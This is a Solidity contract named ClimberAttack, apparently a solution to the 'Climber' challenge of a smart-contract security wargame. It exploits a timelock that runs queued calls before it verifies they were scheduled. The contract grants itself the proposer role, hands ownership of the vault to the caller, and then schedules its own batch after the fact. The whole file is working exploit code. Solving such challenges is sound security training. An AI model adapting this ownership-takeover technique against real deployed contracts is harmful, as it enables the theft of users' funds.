// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import { ClimberTimelock } from "../../climber/ClimberVault.sol";

contract ClimberAttack {
    address payable private immutable timelock;

    address[] private _targets = new address[](3);
    uint256[] private _values = new uint256[](3);
    bytes[] private _elements = new bytes[](3);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _vault, address(this)];
        _values = [0, 0, 0];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[2] = abi.encodeWithSignature("scheduleInTimelock()");
    }

    function executeInTimelock() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("anySalt"));
    }

    function scheduleInTimelock() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("anySalt"));
    }
}
